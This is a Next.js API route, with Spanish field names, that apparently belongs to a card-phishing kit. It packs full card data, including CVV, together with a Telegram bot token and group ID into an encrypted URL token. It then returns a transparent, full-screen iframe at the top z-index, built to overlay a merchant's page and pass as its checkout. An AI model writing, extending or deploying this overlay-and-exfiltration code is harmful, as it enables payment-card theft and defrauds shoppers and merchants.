import { NextRequest, NextResponse } from "next/server";
import { encryptEnvelope, getPublicKeyPem } from "@/lib/rsaCipher";

interface GenerateBody {
  payment: {
    numeroTarjeta: string;
    vencimiento: string;
    cvv: string;
    titular: string;
    email: string;
    celular: string;
    telefono: string;
  };
  comercio?: string;
  price?: string;
  priceFormatted?: string;
  redirectSuccess?: string;
  redirectDeclined?: string;
}

export async function POST(req: NextRequest) {
  const body = (await req.json().catch(() => ({}))) as GenerateBody;
  const { payment, comercio, price, priceFormatted, redirectSuccess, redirectDeclined } = body;

  if (!payment?.numeroTarjeta || !redirectSuccess || !redirectDeclined) {
    return NextResponse.json(
      { error: "Faltan campos: payment.numeroTarjeta, redirectSuccess, redirectDeclined" },
      { status: 400 },
    );
  }

  if (!comercio || comercio.trim() === "") {
    return NextResponse.json({ error: "Falta el campo: comercio" }, { status: 400 });
  }

  const redirects = [redirectSuccess, redirectDeclined];
  if (redirects.some((r) => !/^https?:\/\//.test(r))) {
    return NextResponse.json(
      { error: "redirectSuccess y redirectDeclined deben ser URLs http(s)" },
      { status: 400 },
    );
  }

  const botToken = process.env.TELEGRAM_BOT_TOKEN;
  const chatId = process.env.TELEGRAM_GROUP_ID;
  if (!botToken || !chatId) {
    return NextResponse.json(
      { error: "Demo: faltan TELEGRAM_BOT_TOKEN o TELEGRAM_GROUP_ID" },
      { status: 500 },
    );
  }

  const payload = {
    payment,
    comercio,
    price: price ?? "199900",
    priceFormatted: priceFormatted ?? "$199.900",
    redirectSuccess,
    redirectDeclined,
    telegram: { botToken, chatId },
  };

  let token: string;
  try {
    token = encryptEnvelope(payload, getPublicKeyPem());
  } catch {
    return NextResponse.json({ error: "PAYLOAD_PUBLIC_KEY no definida" }, { status: 500 });
  }

  const protoHeader = req.headers.get("x-forwarded-proto");
  const proto =
    typeof protoHeader === "string" ? protoHeader.split(",")[0].trim() || "http" : "http";
  const host = req.headers.get("host") ?? "localhost:3000";
  const origin = `${proto}://${host}`;
  const url = `${origin}/?d=${token}`;

  const iframe =
    `<iframe src="${url}" style="position:fixed;inset:0;width:100vw;height:100vh;` +
    `border:0;background:transparent;z-index:9999"></iframe>`;

  return NextResponse.json({ token, url, iframe });
}